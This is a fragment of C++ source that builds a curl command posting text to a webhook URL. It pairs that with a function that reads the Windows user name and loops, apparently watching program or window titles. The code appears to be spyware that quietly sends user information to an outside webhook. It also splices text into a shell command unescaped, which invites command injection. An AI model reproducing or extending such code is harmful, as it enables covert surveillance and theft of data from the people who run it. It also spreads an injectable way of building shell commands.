...
const string cmd1p12 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
const string cmd1p22 = "\\\"}\" ";
void SendText2(string text, string webhook_url) {

	string cmd = cmd1p12 + text + cmd1p22 + webhook_url;
...
void find_exe_title()
{
	GetUserName(infoBuf2, &bufCharCount2);
	while (true) {
